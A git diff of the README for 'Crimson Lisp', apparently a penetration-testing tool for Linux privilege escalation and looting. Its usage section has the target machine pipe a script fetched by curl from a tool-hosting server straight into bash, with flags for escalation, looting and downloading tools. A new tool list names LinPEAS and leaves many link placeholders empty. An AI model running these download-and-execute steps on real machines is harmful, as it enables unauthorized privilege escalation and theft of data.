@@ -13,18 +13,44 @@ git clone https://github.com/Karmaz95/crimson_lisp.git
 ```
 # Usage
 ```bash
-# ON THE HOST MACHINE - start the web server:
+# In the CRIMSON_LISP directory start the web server:
 python3 -m http.server 80
 
 # ON THE TARGET MACHINE - download and execute
-curl -s http://127.0.0.1/lisp.sh | bash -s "-e" "-l"
-
+curl -s http://127.0.0.1/lisp.sh | bash -s "-e" "-l" "-u http://127.0.0.1/"
+        
         # -e => PRIVILEGE ESCALATION
         # -l => LOOTING
+        # -u => HOST WITH TOOLS - If only "-u" option is used then only the tools will be downloaded.
 ```
 # HISTORY
 > If you are curious about how it works, read my blog:
 <MEDIUM PLACEHOLDER>
+
+# List of utilized tools
+> The following tools are used in `Crimson Lisp`. I encourage you to study the links below. They will help you in your work.
+
+
+### :diamonds: Privilege escalation:
+*[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+*[]()
+
+
+
 
 # LICENSE
 > This program is free software: you can redistribute it and/or modify it under the terms of the [Apache License](https://choosealicense.com/licenses/apache-2.0/). Crimson Lisp and any contributions are Copyright © by Karol Mazurek 2022.
